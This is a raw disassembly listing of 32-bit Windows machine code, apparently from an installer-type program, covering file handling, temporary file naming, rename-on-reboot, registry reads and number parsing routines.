  405ed8:	e8 3e 05 00 00       	call   0x40641b
  405edd:	3b c7                	cmp    %edi,%eax
  405edf:	56                   	push   %esi
  405ee0:	7f e1                	jg     0x405ec3
  405ee2:	e8 b0 fe ff ff       	call   0x405d97
  405ee7:	56                   	push   %esi
  405ee8:	ff 15 d8 80 40 00    	call   *0x4080d8
  405eee:	33 c9                	xor    %ecx,%ecx
  405ef0:	83 f8 ff             	cmp    $0xffffffff,%eax
  405ef3:	0f 95 c1             	setne  %cl
  405ef6:	8b c1                	mov    %ecx,%eax
  405ef8:	5f                   	pop    %edi
  405ef9:	5e                   	pop    %esi
  405efa:	c2 04 00             	ret    $0x4
  405efd:	55                   	push   %ebp
  405efe:	8b ec                	mov    %esp,%ebp
  405f00:	51                   	push   %ecx
  405f01:	53                   	push   %ebx
  405f02:	56                   	push   %esi
  405f03:	57                   	push   %edi
  405f04:	8b 3d 98 80 40 00    	mov    0x408098,%edi
  405f0a:	ff 75 0c             	push   0xc(%ebp)
  405f0d:	ff d7                	call   *%edi
  405f0f:	8b 75 08             	mov    0x8(%ebp),%esi
  405f12:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405f15:	eb 27                	jmp    0x405f3e
  405f17:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405f1a:	ff 75 0c             	push   0xc(%ebp)
  405f1d:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405f20:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405f24:	56                   	push   %esi
  405f25:	ff 15 fc 80 40 00    	call   *0x4080fc
  405f2b:	85 c0                	test   %eax,%eax
  405f2d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405f30:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405f33:	74 1a                	je     0x405f4f
  405f35:	56                   	push   %esi
  405f36:	ff 15 f4 81 40 00    	call   *0x4081f4
  405f3c:	8b f0                	mov    %eax,%esi
  405f3e:	56                   	push   %esi
  405f3f:	ff d7                	call   *%edi
  405f41:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405f44:	7d d1                	jge    0x405f17
  405f46:	33 c0                	xor    %eax,%eax
  405f48:	5f                   	pop    %edi
  405f49:	5e                   	pop    %esi
  405f4a:	5b                   	pop    %ebx
  405f4b:	c9                   	leave
  405f4c:	c2 08 00             	ret    $0x8
  405f4f:	8b c6                	mov    %esi,%eax
  405f51:	eb f5                	jmp    0x405f48
  405f53:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405f57:	56                   	push   %esi
  405f58:	8b 74 24 10          	mov    0x10(%esp),%esi
  405f5c:	85 f6                	test   %esi,%esi
  405f5e:	76 0f                	jbe    0x405f6f
  405f60:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405f64:	2b c1                	sub    %ecx,%eax
  405f66:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405f69:	88 11                	mov    %dl,(%ecx)
  405f6b:	41                   	inc    %ecx
  405f6c:	4e                   	dec    %esi
  405f6d:	75 f7                	jne    0x405f66
  405f6f:	5e                   	pop    %esi
  405f70:	c2 0c 00             	ret    $0xc
  405f73:	56                   	push   %esi
  405f74:	ff 74 24 08          	push   0x8(%esp)
  405f78:	ff 15 d8 80 40 00    	call   *0x4080d8
  405f7e:	8b f0                	mov    %eax,%esi
  405f80:	83 fe ff             	cmp    $0xffffffff,%esi
  405f83:	74 0d                	je     0x405f92
  405f85:	24 fe                	and    $0xfe,%al
  405f87:	50                   	push   %eax
  405f88:	ff 74 24 0c          	push   0xc(%esp)
  405f8c:	ff 15 d4 80 40 00    	call   *0x4080d4
  405f92:	8b c6                	mov    %esi,%eax
  405f94:	5e                   	pop    %esi
  405f95:	c2 04 00             	ret    $0x4
  405f98:	ff 74 24 04          	push   0x4(%esp)
  405f9c:	ff 15 d8 80 40 00    	call   *0x4080d8
  405fa2:	8b c8                	mov    %eax,%ecx
  405fa4:	6a 00                	push   $0x0
  405fa6:	41                   	inc    %ecx
  405fa7:	f7 d9                	neg    %ecx
  405fa9:	1b c9                	sbb    %ecx,%ecx
  405fab:	23 c8                	and    %eax,%ecx
  405fad:	51                   	push   %ecx
  405fae:	ff 74 24 14          	push   0x14(%esp)
  405fb2:	6a 00                	push   $0x0
  405fb4:	6a 01                	push   $0x1
  405fb6:	ff 74 24 1c          	push   0x1c(%esp)
  405fba:	ff 74 24 1c          	push   0x1c(%esp)
  405fbe:	ff 15 c8 80 40 00    	call   *0x4080c8
  405fc4:	c2 0c 00             	ret    $0xc
  405fc7:	55                   	push   %ebp
  405fc8:	8b ec                	mov    %esp,%ebp
  405fca:	56                   	push   %esi
  405fcb:	8b 75 08             	mov    0x8(%ebp),%esi
  405fce:	57                   	push   %edi
  405fcf:	6a 64                	push   $0x64
  405fd1:	5f                   	pop    %edi
  405fd2:	a1 ec a3 40 00       	mov    0x40a3ec,%eax
  405fd7:	4f                   	dec    %edi
  405fd8:	89 45 08             	mov    %eax,0x8(%ebp)
  405fdb:	ff 15 cc 80 40 00    	call   *0x4080cc
  405fe1:	6a 1a                	push   $0x1a
  405fe3:	33 d2                	xor    %edx,%edx
  405fe5:	59                   	pop    %ecx
  405fe6:	f7 f1                	div    %ecx
  405fe8:	56                   	push   %esi
  405fe9:	8d 45 08             	lea    0x8(%ebp),%eax
  405fec:	6a 00                	push   $0x0
  405fee:	50                   	push   %eax
  405fef:	ff 75 0c             	push   0xc(%ebp)
  405ff2:	00 55 0a             	add    %dl,0xa(%ebp)
  405ff5:	ff 15 74 80 40 00    	call   *0x408074
  405ffb:	85 c0                	test   %eax,%eax
  405ffd:	75 0d                	jne    0x40600c
  405fff:	85 ff                	test   %edi,%edi
  406001:	75 cf                	jne    0x405fd2
  406003:	80 26 00             	andb   $0x0,(%esi)
  406006:	5f                   	pop    %edi
  406007:	5e                   	pop    %esi
  406008:	5d                   	pop    %ebp
  406009:	c2 08 00             	ret    $0x8
  40600c:	8b c6                	mov    %esi,%eax
  40600e:	eb f6                	jmp    0x406006
  406010:	55                   	push   %ebp
  406011:	8b ec                	mov    %esp,%ebp
  406013:	56                   	push   %esi
  406014:	8b 75 10             	mov    0x10(%ebp),%esi
  406017:	8d 45 10             	lea    0x10(%ebp),%eax
  40601a:	6a 00                	push   $0x0
  40601c:	50                   	push   %eax
  40601d:	56                   	push   %esi
  40601e:	ff 75 0c             	push   0xc(%ebp)
  406021:	ff 75 08             	push   0x8(%ebp)
  406024:	ff 15 b8 80 40 00    	call   *0x4080b8
  40602a:	85 c0                	test   %eax,%eax
  40602c:	74 0a                	je     0x406038
  40602e:	3b 75 10             	cmp    0x10(%ebp),%esi
  406031:	75 05                	jne    0x406038
  406033:	33 c0                	xor    %eax,%eax
  406035:	40                   	inc    %eax
  406036:	eb 02                	jmp    0x40603a
  406038:	33 c0                	xor    %eax,%eax
  40603a:	5e                   	pop    %esi
  40603b:	5d                   	pop    %ebp
  40603c:	c2 0c 00             	ret    $0xc
  40603f:	55                   	push   %ebp
  406040:	8b ec                	mov    %esp,%ebp
  406042:	56                   	push   %esi
  406043:	8b 75 10             	mov    0x10(%ebp),%esi
  406046:	8d 45 10             	lea    0x10(%ebp),%eax
  406049:	6a 00                	push   $0x0
  40604b:	50                   	push   %eax
  40604c:	56                   	push   %esi
  40604d:	ff 75 0c             	push   0xc(%ebp)
  406050:	ff 75 08             	push   0x8(%ebp)
  406053:	ff 15 b4 80 40 00    	call   *0x4080b4
  406059:	85 c0                	test   %eax,%eax
  40605b:	74 0a                	je     0x406067
  40605d:	3b 75 10             	cmp    0x10(%ebp),%esi
  406060:	75 05                	jne    0x406067
  406062:	33 c0                	xor    %eax,%eax
  406064:	40                   	inc    %eax
  406065:	eb 02                	jmp    0x406069
  406067:	33 c0                	xor    %eax,%eax
  406069:	5e                   	pop    %esi
  40606a:	5d                   	pop    %ebp
  40606b:	c2 0c 00             	ret    $0xc
  40606e:	53                   	push   %ebx
  40606f:	8b 1d e8 80 40 00    	mov    0x4080e8,%ebx
  406075:	55                   	push   %ebp
  406076:	56                   	push   %esi
  406077:	8b 74 24 14          	mov    0x14(%esp),%esi
  40607b:	57                   	push   %edi
  40607c:	85 f6                	test   %esi,%esi
  40607e:	c7 05 e8 26 42 00 4e 	movl   $0x4c554e,0x4226e8
  406085:	55 4c 00 
  406088:	bf 00 04 00 00       	mov    $0x400,%edi
  40608d:	bd e8 26 42 00       	mov    $0x4226e8,%ebp
  406092:	74 26                	je     0x4060ba
  406094:	6a 01                	push   $0x1
  406096:	6a 00                	push   $0x0
  406098:	56                   	push   %esi
  406099:	e8 fa fe ff ff       	call   0x405f98
  40609e:	50                   	push   %eax
  40609f:	ff 15 f8 80 40 00    	call   *0x4080f8
  4060a5:	57                   	push   %edi
  4060a6:	55                   	push   %ebp
  4060a7:	56                   	push   %esi
  4060a8:	ff d3                	call   *%ebx
  4060aa:	85 c0                	test   %eax,%eax
  4060ac:	0f 84 27 01 00 00    	je     0x4061d9
  4060b2:	3b c7                	cmp    %edi,%eax
  4060b4:	0f 8f 1f 01 00 00    	jg     0x4061d9
  4060ba:	be e8 2a 42 00       	mov    $0x422ae8,%esi
  4060bf:	57                   	push   %edi
  4060c0:	56                   	push   %esi
  4060c1:	ff 74 24 1c          	push   0x1c(%esp)
  4060c5:	ff d3                	call   *%ebx
  4060c7:	85 c0                	test   %eax,%eax
  4060c9:	0f 84 0a 01 00 00    	je     0x4061d9
  4060cf:	3b c7                	cmp    %edi,%eax
  4060d1:	0f 8f 02 01 00 00    	jg     0x4061d9
  4060d7:	56                   	push   %esi
  4060d8:	55                   	push   %ebp
  4060d9:	68 00 a4 40 00       	push   $0x40a400
  4060de:	68 e8 22 42 00       	push   $0x4222e8
  4060e3:	ff 15 18 82 40 00    	call   *0x408218
  4060e9:	8b d8                	mov    %eax,%ebx
  4060eb:	a1 70 43 42 00       	mov    0x424370,%eax
  4060f0:	83 c4 10             	add    $0x10,%esp
  4060f3:	ff b0 28 01 00 00    	push   0x128(%eax)
  4060f9:	56                   	push   %esi
  4060fa:	e8 99 03 00 00       	call   0x406498
  4060ff:	6a 04                	push   $0x4
  406101:	68 00 00 00 c0       	push   $0xc0000000
  406106:	56                   	push   %esi
  406107:	e8 8c fe ff ff       	call   0x405f98
  40610c:	8b e8                	mov    %eax,%ebp
  40610e:	83 fd ff             	cmp    $0xffffffff,%ebp
  406111:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  406115:	0f 84 be 00 00 00    	je     0x4061d9
  40611b:	6a 00                	push   $0x0
  40611d:	55                   	push   %ebp
  40611e:	ff 15 c4 80 40 00    	call   *0x4080c4
  406124:	8b f8                	mov    %eax,%edi
  406126:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  40612a:	50                   	push   %eax
  40612b:	6a 40                	push   $0x40
  40612d:	ff 15 0c 81 40 00    	call   *0x40810c
  406133:	8b f0                	mov    %eax,%esi
  406135:	85 f6                	test   %esi,%esi
  406137:	0f 84 95 00 00 00    	je     0x4061d2
  40613d:	57                   	push   %edi
  40613e:	56                   	push   %esi
  40613f:	55                   	push   %ebp
  406140:	e8 cb fe ff ff       	call   0x406010
  406145:	85 c0                	test   %eax,%eax
  406147:	0f 84 85 00 00 00    	je     0x4061d2
  40614d:	68 f4 a3 40 00       	push   $0x40a3f4
  406152:	56                   	push   %esi
  406153:	e8 a5 fd ff ff       	call   0x405efd
  406158:	85 c0                	test   %eax,%eax
  40615a:	75 14                	jne    0x406170
  40615c:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  40615f:	68 f4 a3 40 00       	push   $0x40a3f4
  406164:	50                   	push   %eax
  406165:	ff 15 40 81 40 00    	call   *0x408140
  40616b:	83 c7 0a             	add    $0xa,%edi
  40616e:	eb 35                	jmp    0x4061a5
  406170:	83 c0 0a             	add    $0xa,%eax
  406173:	68 f0 a3 40 00       	push   $0x40a3f0
  406178:	50                   	push   %eax
  406179:	e8 7f fd ff ff       	call   0x405efd
  40617e:	8b e8                	mov    %eax,%ebp
  406180:	85 ed                	test   %ebp,%ebp
  406182:	74 1d                	je     0x4061a1
  406184:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406187:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  40618a:	eb 06                	jmp    0x406192
  40618c:	8a 11                	mov    (%ecx),%dl
  40618e:	88 10                	mov    %dl,(%eax)
  406190:	48                   	dec    %eax
  406191:	49                   	dec    %ecx
  406192:	3b cd                	cmp    %ebp,%ecx
  406194:	77 f6                	ja     0x40618c
  406196:	2b ee                	sub    %esi,%ebp
  406198:	45                   	inc    %ebp
  406199:	8b c5                	mov    %ebp,%eax
  40619b:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  40619f:	eb 06                	jmp    0x4061a7
  4061a1:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4061a5:	8b c7                	mov    %edi,%eax
  4061a7:	53                   	push   %ebx
  4061a8:	03 c6                	add    %esi,%eax
  4061aa:	68 e8 22 42 00       	push   $0x4222e8
  4061af:	50                   	push   %eax
  4061b0:	e8 9e fd ff ff       	call   0x405f53
  4061b5:	33 c0                	xor    %eax,%eax
  4061b7:	50                   	push   %eax
  4061b8:	50                   	push   %eax
  4061b9:	50                   	push   %eax
  4061ba:	55                   	push   %ebp
  4061bb:	ff 15 28 81 40 00    	call   *0x408128
  4061c1:	03 fb                	add    %ebx,%edi
  4061c3:	57                   	push   %edi
  4061c4:	56                   	push   %esi
  4061c5:	55                   	push   %ebp
  4061c6:	e8 74 fe ff ff       	call   0x40603f
  4061cb:	56                   	push   %esi
  4061cc:	ff 15 08 81 40 00    	call   *0x408108
  4061d2:	55                   	push   %ebp
  4061d3:	ff 15 f8 80 40 00    	call   *0x4080f8
  4061d9:	5f                   	pop    %edi
  4061da:	5e                   	pop    %esi
  4061db:	5d                   	pop    %ebp
  4061dc:	5b                   	pop    %ebx
  4061dd:	c3                   	ret
  4061de:	6a 05                	push   $0x5
  4061e0:	ff 74 24 0c          	push   0xc(%esp)
  4061e4:	ff 74 24 0c          	push   0xc(%esp)
  4061e8:	ff 15 44 81 40 00    	call   *0x408144
  4061ee:	85 c0                	test   %eax,%eax
  4061f0:	75 0f                	jne    0x406201
  4061f2:	ff 74 24 08          	push   0x8(%esp)
  4061f6:	ff 74 24 08          	push   0x8(%esp)
  4061fa:	e8 6f fe ff ff       	call   0x40606e
  4061ff:	59                   	pop    %ecx
  406200:	59                   	pop    %ecx
  406201:	ff 05 f0 43 42 00    	incl   0x4243f0
  406207:	c2 08 00             	ret    $0x8
  40620a:	53                   	push   %ebx
  40620b:	33 db                	xor    %ebx,%ebx
  40620d:	38 1d 1c 44 42 00    	cmp    %bl,0x42441c
  406213:	56                   	push   %esi
  406214:	8b 74 24 10          	mov    0x10(%esp),%esi
  406218:	57                   	push   %edi
  406219:	0f 9c c3             	setl   %bl
  40621c:	8b 06                	mov    (%esi),%eax
  40621e:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406222:	f7 db                	neg    %ebx
  406224:	1b db                	sbb    %ebx,%ebx
  406226:	32 db                	xor    %bl,%bl
  406228:	81 c3 00 01 00 00    	add    $0x100,%ebx
  40622e:	a8 20                	test   $0x20,%al
  406230:	74 32                	je     0x406264
  406232:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  406238:	74 2a                	je     0x406264
  40623a:	8b cf                	mov    %edi,%ecx
  40623c:	ba 00 03 00 00       	mov    $0x300,%edx
  406241:	c1 e9 15             	shr    $0x15,%ecx
  406244:	23 ca                	and    %edx,%ecx
  406246:	3b ca                	cmp    %edx,%ecx
  406248:	75 0a                	jne    0x406254
  40624a:	8b cb                	mov    %ebx,%ecx
  40624c:	f7 d1                	not    %ecx
  40624e:	23 0d 10 44 42 00    	and    0x424410,%ecx
  406254:	80 e4 fe             	and    $0xfe,%ah
  406257:	0b c1                	or     %ecx,%eax
  406259:	80 e4 fd             	and    $0xfd,%ah
  40625c:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  406262:	eb 0d                	jmp    0x406271
  406264:	a9 00 00 10 00       	test   $0x100000,%eax
  406269:	74 06                	je     0x406271
  40626b:	0b 05 10 44 42 00    	or     0x424410,%eax
  406271:	8b c8                	mov    %eax,%ecx
  406273:	23 c3                	and    %ebx,%eax
  406275:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  40627b:	f7 d8                	neg    %eax
  40627d:	1b c0                	sbb    %eax,%eax
  40627f:	89 0e                	mov    %ecx,(%esi)
  406281:	f7 d0                	not    %eax
  406283:	23 c7                	and    %edi,%eax
  406285:	5f                   	pop    %edi
  406286:	5e                   	pop    %esi
  406287:	5b                   	pop    %ebx
  406288:	c2 08 00             	ret    $0x8
  40628b:	55                   	push   %ebp
  40628c:	8b ec                	mov    %esp,%ebp
  40628e:	8d 45 10             	lea    0x10(%ebp),%eax
  406291:	50                   	push   %eax
  406292:	ff 75 08             	push   0x8(%ebp)
  406295:	e8 70 ff ff ff       	call   0x40620a
  40629a:	85 c0                	test   %eax,%eax
  40629c:	75 05                	jne    0x4062a3
  40629e:	6a 06                	push   $0x6
  4062a0:	58                   	pop    %eax
  4062a1:	eb 12                	jmp    0x4062b5
  4062a3:	ff 75 14             	push   0x14(%ebp)
  4062a6:	ff 75 10             	push   0x10(%ebp)
  4062a9:	6a 00                	push   $0x0
  4062ab:	ff 75 0c             	push   0xc(%ebp)
  4062ae:	50                   	push   %eax
  4062af:	ff 15 28 80 40 00    	call   *0x408028
  4062b5:	5d                   	pop    %ebp
  4062b6:	c2 10 00             	ret    $0x10
  4062b9:	55                   	push   %ebp
  4062ba:	8b ec                	mov    %esp,%ebp
  4062bc:	8d 45 10             	lea    0x10(%ebp),%eax
  4062bf:	50                   	push   %eax
  4062c0:	ff 75 08             	push   0x8(%ebp)
  4062c3:	e8 42 ff ff ff       	call   0x40620a
  4062c8:	33 c9                	xor    %ecx,%ecx
  4062ca:	3b c1                	cmp    %ecx,%eax
  4062cc:	75 05                	jne    0x4062d3
  4062ce:	6a 06                	push   $0x6
  4062d0:	58                   	pop    %eax
  4062d1:	eb 15                	jmp    0x4062e8
  4062d3:	51                   	push   %ecx
  4062d4:	ff 75 14             	push   0x14(%ebp)
  4062d7:	51                   	push   %ecx
  4062d8:	ff 75 10             	push   0x10(%ebp)
  4062db:	51                   	push   %ecx
  4062dc:	51                   	push   %ecx
  4062dd:	51                   	push   %ecx
  4062de:	ff 75 0c             	push   0xc(%ebp)
  4062e1:	50                   	push   %eax
  4062e2:	ff 15 2c 80 40 00    	call   *0x40802c
  4062e8:	5d                   	pop    %ebp
  4062e9:	c2 10 00             	ret    $0x10
  4062ec:	55                   	push   %ebp
  4062ed:	8b ec                	mov    %esp,%ebp
  4062ef:	51                   	push   %ecx
  4062f0:	8d 45 18             	lea    0x18(%ebp),%eax
  4062f3:	56                   	push   %esi
  4062f4:	50                   	push   %eax
  4062f5:	8b 45 18             	mov    0x18(%ebp),%eax
  4062f8:	f7 d8                	neg    %eax
  4062fa:	1b c0                	sbb    %eax,%eax
  4062fc:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  406303:	25 00 01 00 00       	and    $0x100,%eax
  406308:	0d 19 00 02 00       	or     $0x20019,%eax
  40630d:	50                   	push   %eax
  40630e:	ff 75 0c             	push   0xc(%ebp)
  406311:	ff 75 08             	push   0x8(%ebp)
  406314:	e8 72 ff ff ff       	call   0x40628b
  406319:	8b 75 14             	mov    0x14(%ebp),%esi
  40631c:	85 c0                	test   %eax,%eax
  40631e:	75 3b                	jne    0x40635b
  406320:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406323:	57                   	push   %edi
  406324:	50                   	push   %eax
  406325:	8d 45 0c             	lea    0xc(%ebp),%eax
  406328:	56                   	push   %esi
  406329:	50                   	push   %eax
  40632a:	6a 00                	push   $0x0
  40632c:	ff 75 10             	push   0x10(%ebp)
  40632f:	ff 75 18             	push   0x18(%ebp)
  406332:	ff 15 08 80 40 00    	call   *0x408008
  406338:	ff 75 18             	push   0x18(%ebp)
  40633b:	8b f8                	mov    %eax,%edi
  40633d:	ff 15 10 80 40 00    	call   *0x408010
  406343:	80 a6 ff 03 00 00 00 	andb   $0x0,0x3ff(%esi)
  40634a:	85 ff                	test   %edi,%edi
  40634c:	5f                   	pop    %edi
  40634d:	75 0c                	jne    0x40635b
  40634f:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  406353:	74 09                	je     0x40635e
  406355:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  406359:	74 03                	je     0x40635e
  40635b:	80 26 00             	andb   $0x0,(%esi)
  40635e:	5e                   	pop    %esi
  40635f:	c9                   	leave
  406360:	c2 14 00             	ret    $0x14
  406363:	ff 74 24 08          	push   0x8(%esp)
  406367:	68 a4 83 40 00       	push   $0x4083a4
  40636c:	ff 74 24 0c          	push   0xc(%esp)
  406370:	ff 15 18 82 40 00    	call   *0x408218
  406376:	83 c4 0c             	add    $0xc,%esp
  406379:	c2 08 00             	ret    $0x8
  40637c:	55                   	push   %ebp
  40637d:	8b ec                	mov    %esp,%ebp
  40637f:	51                   	push   %ecx
  406380:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406383:	53                   	push   %ebx
  406384:	56                   	push   %esi
  406385:	57                   	push   %edi
  406386:	33 ff                	xor    %edi,%edi
  406388:	80 39 2d             	cmpb   $0x2d,(%ecx)
  40638b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  406392:	b0 0a                	mov    $0xa,%al
  406394:	b3 39                	mov    $0x39,%bl
  406396:	75 05                	jne    0x40639d
  406398:	41                   	inc    %ecx
  406399:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40639d:	80 39 30             	cmpb   $0x30,(%ecx)
  4063a0:	75 1c                	jne    0x4063be
  4063a2:	41                   	inc    %ecx
  4063a3:	8a 11                	mov    (%ecx),%dl
  4063a5:	80 fa 30             	cmp    $0x30,%dl
  4063a8:	7c 09                	jl     0x4063b3
  4063aa:	80 fa 37             	cmp    $0x37,%dl
  4063ad:	7f 04                	jg     0x4063b3
  4063af:	b0 08                	mov    $0x8,%al
  4063b1:	b3 37                	mov    $0x37,%bl
  4063b3:	80 e2 df             	and    $0xdf,%dl
  4063b6:	80 fa 58             	cmp    $0x58,%dl
  4063b9:	75 03                	jne    0x4063be
  4063bb:	b0 10                	mov    $0x10,%al
  4063bd:	41                   	inc    %ecx
  4063be:	0f be 11             	movsbl (%ecx),%edx
  4063c1:	41                   	inc    %ecx
  4063c2:	83 fa 30             	cmp    $0x30,%edx
  4063c5:	7c 0c                	jl     0x4063d3
  4063c7:	0f be f3             	movsbl %bl,%esi
  4063ca:	3b d6                	cmp    %esi,%edx
  4063cc:	7f 05                	jg     0x4063d3
  4063ce:	83 ea 30             	sub    $0x30,%edx
  4063d1:	eb 19                	jmp    0x4063ec
  4063d3:	3c 10                	cmp    $0x10,%al
  4063d5:	75 21                	jne    0x4063f8
  4063d7:	8b f2                	mov    %edx,%esi
  4063d9:	83 e6 df             	and    $0xffffffdf,%esi
  4063dc:	83 fe 41             	cmp    $0x41,%esi
  4063df:	7c 17                	jl     0x4063f8
  4063e1:	83 fe 46             	cmp    $0x46,%esi
  4063e4:	7f 12                	jg     0x4063f8
  4063e6:	83 e2 07             	and    $0x7,%edx
  4063e9:	83 c2 09             	add    $0x9,%edx
  4063ec:	0f be f0             	movsbl %al,%esi
  4063ef:	0f af f7             	imul   %edi,%esi
  4063f2:	03 f2                	add    %edx,%esi
  4063f4:	8b fe                	mov    %esi,%edi
  4063f6:	eb c6                	jmp    0x4063be
  4063f8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063fb:	0f af c7             	imul   %edi,%eax
  4063fe:	5f                   	pop    %edi
  4063ff:	5e                   	pop    %esi
  406400:	5b                   	pop    %ebx
  406401:	c9                   	leave
  406402:	c2 04 00             	ret    $0x4
  406405:	68 00 04 00 00       	push   $0x400
  40640a:	ff 74 24 0c          	push   0xc(%esp)
  40640e:	ff 74 24 0c          	push   0xc(%esp)
  406412:	ff 15 8c 80 40 00    	call   *0x40808c
  406418:	c2 08 00             	ret    $0x8
  40641b:	ff 25 98 80 40 00    	jmp    *0x408098
  406421:	ff 25 48 81 40 00    	jmp    *0x408148
  406427:	33 c0                	xor    %eax,%eax
  406429:	50                   	push   %eax
  40642a:	50                   	push   %eax
  40642b:	ff 74 24 14          	push   0x14(%esp)
  40642f:	ff 74 24 14          	push   0x14(%esp)
  406433:	6a ff                	push   $0xffffffff
  406435:	ff 74 24 18          	push   0x18(%esp)
  406439:	50                   	push   %eax
  40643a:	50                   	push   %eax
  40643b:	ff 15 4c 81 40 00    	call   *0x40814c
  406441:	c3                   	ret
  406442:	68 00 04 00 00       	push   $0x400
  406447:	ff 74 24 08          	push   0x8(%esp)
  40644b:	ff 74 24 10          	push   0x10(%esp)
  40644f:	e8 d3 ff ff ff       	call   0x406427
  406454:	83 c4 0c             	add    $0xc,%esp
  406457:	c3                   	ret
  406458:	55                   	push   %ebp
  406459:	8b ec                	mov    %esp,%ebp
  40645b:	81 ec 04 01 00 00    	sub    $0x104,%esp
  406461:	32 d2                	xor    %dl,%dl
  406463:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406466:	0f be c2             	movsbl %dl,%eax
  406469:	66 0f be 0c 08       	movsbw (%eax,%ecx,1),%cx
  40646e:	66 85 c9             	test   %cx,%cx
  406471:	66 89 8c 45 fc fe ff 	mov    %cx,-0x104(%ebp,%eax,2)
  406478:	ff 
  406479:	74 0b                	je     0x406486
  40647b:	fe c2                	inc    %dl
  40647d:	79 e4                	jns    0x406463
  40647f:	b8 05 40 00 80       	mov    $0x80004005,%eax
  406484:	c9                   	leave
  406485:	c3                   	ret
  406486:	ff 75 0c             	push   0xc(%ebp)
  406489:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40648f:	50                   	push   %eax
  406490:	ff 15 84 82 40 00    	call   *0x408284
  406496:	c9                   	leave
  406497:	c3                   	ret
  406498:	55                   	push   %ebp
  406499:	8b ec                	mov    %esp,%ebp
  40649b:	83 ec 18             	sub    $0x18,%esp
  40649e:	8b 45 0c             	mov    0xc(%ebp),%eax
  4064a1:	85 c0                	test   %eax,%eax
  4064a3:	7d 11                	jge    0x4064b6
  4064a5:	8b 0d 3c 3b 42 00    	mov    0x423b3c,%ecx
  4064ab:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4064b2:	2b c8                	sub    %eax,%ecx
  4064b4:	8b 01                	mov    (%ecx),%eax
  4064b6:	8b 0d 98 43 42 00    	mov    0x424398,%ecx
  4064bc:	53                   	push   %ebx
  4064bd:	03 c8                	add    %eax,%ecx
  4064bf:	b8 00 33 42 00       	mov    $0x423300,%eax
  4064c4:	39 45 08             	cmp    %eax,0x8(%ebp)
  4064c7:	56                   	push   %esi
  4064c8:	57                   	push   %edi
  4064c9:	8b f8                	mov    %eax,%edi
  4064cb:	0f 82 0b 02 00 00    	jb     0x4066dc
  4064d1:	8b 55 08             	mov    0x8(%ebp),%edx
  4064d4:	2b d0                	sub    %eax,%edx
  4064d6:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  4064dc:	0f 83 fa 01 00 00    	jae    0x4066dc
  4064e2:	8b 7d 08             	mov    0x8(%ebp),%edi
  4064e5:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  4064e9:	e9 ee 01 00 00       	jmp    0x4066dc
  4064ee:	8b f7                	mov    %edi,%esi
  4064f0:	2b f0                	sub    %eax,%esi
  4064f2:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  4064f8:	0f 8d e8 01 00 00    	jge    0x4066e6
  4064fe:	41                   	inc    %ecx
  4064ff:	80 fa 04             	cmp    $0x4,%dl
  406502:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406505:	0f 83 c4 01 00 00    	jae    0x4066cf
  40650b:	0f be 41 01          	movsbl 0x1(%ecx),%eax
  40650f:	0f be 09             	movsbl (%ecx),%ecx
  406512:	8b f0                	mov    %eax,%esi
  406514:	8b d9                	mov    %ecx,%ebx
  406516:	83 e6 7f             	and    $0x7f,%esi
  406519:	83 e3 7f             	and    $0x7f,%ebx
  40651c:	c1 e6 07             	shl    $0x7,%esi
  40651f:	0b f3                	or     %ebx,%esi
  406521:	8b d9                	mov    %ecx,%ebx
  406523:	80 cf 80             	or     $0x80,%bh
  406526:	6a 02                	push   $0x2
  406528:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40652b:	8b d8                	mov    %eax,%ebx
  40652d:	80 cf 80             	or     $0x80,%bh
  406530:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  406533:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  406536:	8b d8                	mov    %eax,%ebx
  406538:	58                   	pop    %eax
  406539:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40653c:	01 45 fc             	add    %eax,-0x4(%ebp)
  40653f:	3a d0                	cmp    %al,%dl
  406541:	0f 85 32 01 00 00    	jne    0x406679
  406547:	80 3d 1c 44 42 00 00 	cmpb   $0x0,0x42441c
  40654e:	89 45 0c             	mov    %eax,0xc(%ebp)
  406551:	75 1b                	jne    0x40656e
  406553:	66 81 3d 1e 44 42 00 	cmpw   $0x45a,0x42441e
  40655a:	5a 04 
  40655c:	73 10                	jae    0x40656e
  40655e:	83 fb 23             	cmp    $0x23,%ebx
  406561:	74 0b                	je     0x40656e
  406563:	83 fb 2e             	cmp    $0x2e,%ebx
  406566:	74 06                	je     0x40656e
  406568:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40656c:	eb 07                	jmp    0x406575
  40656e:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
